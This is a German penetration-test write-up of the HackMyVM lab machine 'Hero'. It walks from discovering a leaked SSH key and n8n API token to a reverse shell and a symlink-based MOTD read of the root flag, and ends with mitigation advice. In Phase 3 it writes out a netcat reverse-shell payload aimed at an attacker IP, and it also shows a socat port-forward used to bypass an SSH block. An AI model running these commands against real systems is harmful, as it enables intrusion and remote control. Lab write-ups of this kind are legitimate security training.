# Hero (HackMyVM) - Penetration Test Bericht

![Hero.png](Hero.png)

**Datum des Berichts:** 7. Februar 2025  
**VM:** Hero  
**Plattform:** HackMyVM ([Link zur VM](https://hackmyvm.eu/machines/machine.php?vm=Hero))  
**Autor der VM:** DarkSpirit  
**Original Writeup:** [https://alientec1908.github.io/Hero_HackMyVM_Medium/](https://alientec1908.github.io/Hero_HackMyVM_Medium/)

---

## Disclaimer

**Wichtiger Hinweis:** Dieser Bericht und die darin enthaltenen Informationen dienen ausschließlich zu Bildungs- und Forschungszwecken im Bereich der Cybersicherheit. Die hier beschriebenen Techniken und Werkzeuge dürfen nur in legalen und autorisierten Umgebungen (z.B. auf eigenen Systemen oder mit ausdrücklicher Genehmigung des Eigentümers) angewendet werden. Jegliche illegale Nutzung der hier bereitgestellten Informationen ist strengstens untersagt. Der Autor übernimmt keine Haftung für Schäden, die durch Missbrauch dieser Informationen entstehen. Handeln Sie stets verantwortungsbewusst und ethisch.

---

## Inhaltsverzeichnis

1.  [Zusammenfassung](#zusammenfassung)
2.  [Verwendete Tools](#verwendete-tools)
3.  [Phase 1: Reconnaissance](#phase-1-reconnaissance)
4.  [Phase 2: Web Enumeration & Credential Discovery](#phase-2-web-enumeration--credential-discovery)
5.  [Phase 3: Initial Access (via n8n Workflow Automation)](#phase-3-initial-access-via-n8n-workflow-automation)
6.  [Phase 4: Privilege Escalation (MOTD/Banner Abuse)](#phase-4-privilege-escalation-motdbanner-abuse)
7.  [Proof of Concept (Privilege Escalation)](#proof-of-concept-privilege-escalation)
8.  [Flags](#flags)
9.  [Empfohlene Maßnahmen (Mitigation)](#empfohlene-maßnahmen-mitigation)

---

## Zusammenfassung

Dieser Bericht dokumentiert die Kompromittierung der virtuellen Maschine "Hero" von HackMyVM (Schwierigkeitsgrad: Medium). Die initiale Erkundung offenbarte offene HTTP-Ports (80 und 5678). Auf Port 80 wurde in der `index.html` ein privater SSH-Schlüssel für den Benutzer `shawa` gefunden. Der direkte SSH-Zugriff war jedoch blockiert. Auf Port 5678 lief eine **n8n.io** Workflow-Automatisierungsinstanz. Ein im Frontend gefundener JWT wurde als API-Schlüssel verwendet, um SSH-Credentials innerhalb von n8n für den Benutzer `shawa` zu konfigurieren und eine Verbindung zu einer internen IP (`172.17.0.1`) herzustellen. Über einen n8n-Workflow wurde eine Reverse Shell als `shawa` erlangt.

Die Privilegieneskalation zu Root-Rechten erfolgte durch Ausnutzung einer unsicheren Konfiguration des Verzeichnisses `/opt` und der Datei `/opt/banner.txt`, die als Message of the Day (MOTD) bei SSH-Logins angezeigt wurde. Da `/opt` und `banner.txt` für `shawa` beschreibbar waren, konnte `banner.txt` durch einen symbolischen Link auf `/root/root.txt` ersetzt werden. Beim nächsten SSH-Login wurde der Inhalt von `/root/root.txt` (die Root-Flagge) als MOTD angezeigt.

---

## Verwendete Tools

*   `arp-scan`
*   `vi`
*   `ip`, `grep`, `awk`, `sort` (für IPv6-Enumeration)
*   `nmap`
*   `curl`
*   `nikto`
*   `gobuster`
*   `cat`
*   `chmod`
*   `ssh`
*   `ssh2john`
*   `ssh-keyscan`
*   `jwt.io` (Webservice)
*   `dirsearch`
*   `ffuf`
*   `sqlmap` (versucht, erfolglos)
*   `nc (netcat)`
*   `ssh-keygen`
*   `which`
*   `rm`
*   `mkfifo`
*   `netstat`
*   `hostnamectl` (versucht, nicht vorhanden)
*   `crontab` (Benutzer-Crontab)
*   `find`
*   `ln`
*   `john` (versucht, erfolglos)
*   `echo`
*   `wget`
*   `socat`

---

## Phase 1: Reconnaissance

1.  **Netzwerk-Scan (ARP, IPv4, IPv6):**
    *   `arp-scan` identifizierte das Ziel `192.168.2.171` (VirtualBox VM). Der Hostname `hero.hmv` wurde der `/etc/hosts`-Datei hinzugefügt.
    *   Ein IPv6-Scan (`nmap -6 [...] fe80::a00:27ff:fec9:9b73`) fand offene Ports 80 (HTTP) und 5678 (rrac/unbekannt).
    *   Ein UDP-Scan (`nmap -sU --top-port 1000 [...]`) fand keine offenen UDP-Ports.
    *   Ein vollständiger TCP-Scan (`nmap -sS -sC -sV -A -p- [...]`) bestätigte die offenen Ports 80 (nginx) und 5678 (rrac?).

2.  **HTTP-Header-Analyse:**
    *   `curl` (OPTIONS, HEAD) auf Port 80 zeigte Standard-Nginx-Header und erlaubte Methoden (GET, HEAD, POST).
    *   `nikto` auf Port 80 wies auf fehlende Sicherheitsheader (X-Frame-Options, X-Content-Type-Options) und **kritisch**, auf eine potenzielle Backup-Datei `/#wp-config.php#` hin (dieser Hinweis wurde im weiteren Verlauf nicht weiterverfolgt, da andere Vektoren erfolgreicher waren).

---

## Phase 2: Web Enumeration & Credential Discovery

1.  **Verzeichnis-Enumeration (Port 80 & 5678):**
    *   `gobuster` auf Port 80 fand `/index.html`.
    *   `gobuster` auf Port 5678 (hero.hmv:5678) fand `/index.html`, `/static/`, `/assets/`, `/types/`.

2.  **SSH-Schlüssel in `index.html` (Port 80):**
    *   `curl -s http://192.168.2.171/index.html -o key.txt`
    *   Die `index.html`-Datei enthielt einen privaten OpenSSH-Schlüssel (Ed25519) für den Benutzer `shawa` (Kommentar im Schlüssel: `shawa@hero`).
    *   Der Schlüssel war nicht passwortgeschützt (`ssh2john key.txt` bestätigte dies).
    *   Direkte SSH-Login-Versuche (`ssh shawa@192.168.2.171 -i key.txt`) scheiterten mit "Connection refused", obwohl Port 22 von Nmap als offen gemeldet wurde. Dies deutete auf eine Firewall oder eine SSH-Konfiguration hin, die nur interne Verbindungen zulässt.

3.  **n8n.io Instanz auf Port 5678:**
    *   Der Aufruf von `http://hero.hmv:5678/setup` identifizierte die Anwendung als **n8n.io** (Workflow Automation).
    *   Im Quellcode/Frontend dieser Seite wurde ein **JSON Web Token (JWT)** gefunden:
        ```
        eyJhbGciiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiiJlTFhNWU2S0yYzBiLTRhMTktTQ3MC1jZGUzGNhYjE5GMiLCJpc3MiiJuG4iLCJhdWQiiJwdWJsaWMtYXBpIiwiaWF0IjoxNzM4TY5MjA1fQ.v7k5uyavedgnZQQKK5gAFbuA1W4Pw29-9Rm61U6FchM
        ```
    *   Die Dekodierung des JWTs (HS256) auf jwt.io zeigte Standard-Claims, aber keine direkten Credentials. Das Token wurde als API-Schlüssel für die n8n-Instanz interpretiert.
    *   `dirsearch` auf Port 5678 fand u.a. `/healthz`.
    *   `ffuf` auf Port 5678 unter `/rest/` fand `/rest/settings`.
    *   `sqlmap`-Versuche auf `/rest/login` waren erfolglos.
    *   `curl http://192.168.2.171:5678/rest/sentry.js` enthüllte die n8n-Version: `1.76.3`.

---

## Phase 3: Initial Access (via n8n Workflow Automation)

1.  **n8n API-Interaktion:**
    *   Mit dem gefundenen JWT als `X-N8N-API-KEY` Header wurde die n8n API angesprochen.
    *   `GET /api/v1/workflows` listete einen existierenden Workflow namens "Exploit" auf, der einen "Execute Command"-Knoten mit dem Befehl `id` enthielt, aber keinen Trigger.
    *   Versuche, diesen Workflow direkt zu aktivieren oder auszuführen, scheiterten.
    *   Ein `POST`-Request an `/api/v1/workflows` zeigte, dass neue Workflows erstellt werden konnten.

2.  **SSH-Credential-Konfiguration in n8n UI:**
    *   Die n8n-Weboberfläche (`http://192.168.2.171:5678/`) wurde genutzt, um SSH-Credentials zu erstellen:
        *   **Host:** `172.17.0.1` (Diese interne IP wurde vermutlich beim VM-Start oder durch andere Enumeration als die IP des Docker-Hosts/Containers identifiziert, auf dem n8n läuft).
        *   **Port:** `22`
        *   **Username:** `shawa`
        *   **Private Key:** Der Inhalt der zuvor gefundenen `key.txt`.
        *   Der Verbindungstest innerhalb von n8n war erfolgreich.

3.  **Reverse Shell via n8n Workflow:**
    *   Ein n8n-Workflow wurde erstellt/modifiziert, um die konfigurierten SSH-Credentials zu nutzen und einen Befehl auf `172.17.0.1` auszuführen.
    *   Die erfolgreiche Reverse-Shell-Payload war:
        ```bash
        mkfifo /tmp/f; nc 192.168.2.199 4444 < /tmp/f | sh > /tmp/f 2>&1; rm /tmp/f
        ```
        *(Die Angreifer-IP war `192.168.2.199`)*
    *   Ein `nc -lvnp 4444` auf dem Angreifer-System empfing die Verbindung und gewährte eine Shell als `shawa`.

---

## Phase 4: Privilege Escalation (MOTD/Banner Abuse)

1.  **Shell-Stabilisierung und Enumeration als `shawa`:**
    *   Eine stabilere Shell wurde mit einer weiteren `mkfifo`-Technik auf Port 4445 etabliert.
    *   `id` bestätigte `uid=1000(shawa)`.
    *   Die User-Flag wurde in `/home/shawa/user.txt` gefunden: `HMVHIMNTREAL`.
    *   Das System wurde als Alpine Linux v3.21 identifiziert (`cat /etc/os-release`).
    *   `sudo` war nicht installiert.
    *   `find / -type f -perm -4000 [...]` fand die SUID-Datei `/bin/bbsuid` (wurde nicht weiter untersucht).

2.  **Umgehung der SSH-Blockade mit `socat`:**
    *   Da der direkte SSH-Zugriff blockiert war, wurde `socat` vom Angreifer-Server auf `/tmp` des Ziels heruntergeladen, ausführbar gemacht und gestartet, um Port 2222 auf `192.168.2.171` an `172.17.0.1:22` weiterzuleiten:
        ```bash
        ./socat TCP-LISTEN:2222,fork TCP4:172.17.0.1:22 &
        ```
    *   Ein SSH-Login als `shawa` über Port 2222 mit dem Schlüssel war nun erfolgreich: `ssh shawa@192.168.2.171 -i key.txt -p 2222`.

3.  **Entdeckung der MOTD/Banner-Schwachstelle:**
    *   Die SSH-Login-Nachricht (MOTD) enthielt "shawa was here.".
    *   Untersuchung von `/opt` zeigte:
        *   Das Verzeichnis `/opt` war für alle Benutzer beschreibbar (`drw-rw-rwx`).
        *   Die Datei `/opt/banner.txt` war für alle beschreibbar (`-rw-rw-rw-`) und enthielt "shawa was here.".

4.  **Ausnutzung der Schwachstelle:**
    *   Als `shawa` wurden folgende Befehle in `/opt` ausgeführt:
        ```bash
        rm banner.txt
        ln -s /root/root.txt banner.txt
        ```
    *   Beim erneuten SSH-Login über Port 2222 wurde der Inhalt von `/root/root.txt` als erste Zeile der MOTD angezeigt, wodurch die Root-Flagge `HMVNTINPRDLL` preisgegeben wurde.

---

## Proof of Concept (Privilege Escalation)

**Kurzbeschreibung:** Die Privilege Escalation wurde durch unsichere Berechtigungen des Verzeichnisses `/opt` und der darin befindlichen Datei `/opt/banner.txt` ermöglicht, die bei SSH-Logins als Message of the Day (MOTD) angezeigt wird. Da der Benutzer `shawa` Schreibrechte in `/opt` und auf `banner.txt` hatte, konnte er `banner.txt` durch einen symbolischen Link auf eine beliebige Datei (z.B. `/root/root.txt`) ersetzen. Der Prozess, der die MOTD anzeigt (vermutlich mit Root-Rechten), folgte diesem Symlink und gab den Inhalt der Zieldatei aus.

**Schritte (als `shawa` in der SSH-Sitzung):**
1.  Wechsle in das Verzeichnis `/opt`:
    ```bash
    cd /opt
    ```
2.  Lösche die existierende `banner.txt`:
    ```bash
    rm banner.txt
    ```
3.  Erstelle einen symbolischen Link von `banner.txt` zu `/root/root.txt`:
    ```bash
    ln -s /root/root.txt banner.txt
    ```
4.  Logge dich erneut per SSH ein (z.B. über den `socat`-Tunnel auf Port 2222).
**Ergebnis:** Der Inhalt von `/root/root.txt` (die Root-Flagge) wird als Teil der MOTD angezeigt.

---

## Flags

*   **User Flag (`/home/shawa/user.txt`):**
    ```
    HMVHIMNTREAL
    ```
*   **Root Flag (Ausgabe via MOTD nach Symlink auf `/root/root.txt`):**
    ```
    HMVNTINPRDLL
    ```

---

## Empfohlene Maßnahmen (Mitigation)

*   **Webserver-Sicherheit (Port 80):**
    *   **Entfernen Sie private SSH-Schlüssel und andere sensible Informationen aus öffentlich zugänglichen Webdateien (wie `index.html`).**
    *   Entfernen Sie Backup-Konfigurationsdateien (wie `wp-config.php~`, `.bak`) aus dem Web-Root.
    *   Implementieren Sie empfohlene Sicherheitsheader (X-Frame-Options, X-Content-Type-Options etc.).
*   **n8n.io Sicherheit (Port 5678):**
    *   **Schützen Sie den Zugriff auf die n8n-Instanz und ihre API mit starker Authentifizierung.** Vermeiden Sie das Exponieren von API-Schlüsseln im Frontend.
    *   Beschränken Sie die Berechtigungen von API-Schlüsseln nach dem Prinzip der geringsten Rechte (z.B. keine Berechtigung zum Erstellen/Modifizieren von Workflows oder SSH-Credentials, falls nicht zwingend nötig).
    *   Beschränken Sie die Netzwerkzugriffe der n8n-Instanz (insbesondere ausgehende Verbindungen und die Möglichkeit, interne SSH-Verbindungen aufzubauen).
    *   Halten Sie n8n und alle Abhängigkeiten auf dem neuesten Stand.
*   **SSH-Sicherheit:**
    *   Konfigurieren Sie den SSH-Dienst so, dass er nur auf den notwendigen Schnittstellen lauscht. Wenn externer Zugriff nicht benötigt wird, blockieren Sie ihn per Firewall.
    *   Verwenden Sie Passphrasen für private SSH-Schlüssel.
*   **Dateisystemberechtigungen und MOTD:**
    *   **Korrigieren Sie dringend die unsicheren Berechtigungen für das Verzeichnis `/opt` (z.B. `chmod 755 /opt`) und für Dateien wie `/opt/banner.txt` (z.B. `chmod 644 /opt/banner.txt`).** Verzeichnisse, die von Systemprozessen gelesen werden, sollten nicht allgemein beschreibbar sein.
    *   Stellen Sie sicher, dass Prozesse, die MOTD- oder Banner-Dateien lesen, dies sicher tun und nicht blind Symlinks in unsicheren Verzeichnissen folgen oder unerwartete Inhalte ausführen.
*   **Systemhärtung (Alpine Linux Container):**
    *   Verhindern Sie das Herunterladen und Ausführen unbekannter Binärdateien (z.B. `socat` in `/tmp`) durch geeignete Sicherheitsrichtlinien oder Tools.
    *   Überwachen Sie die Prozessliste auf verdächtige Aktivitäten.
    *   Entfernen Sie unnötige SUID-Binaries (wie das potenziell benutzerdefinierte `/bin/bbsuid`, falls es unsicher ist).

---

**Ben C. - Cyber Security Reports**
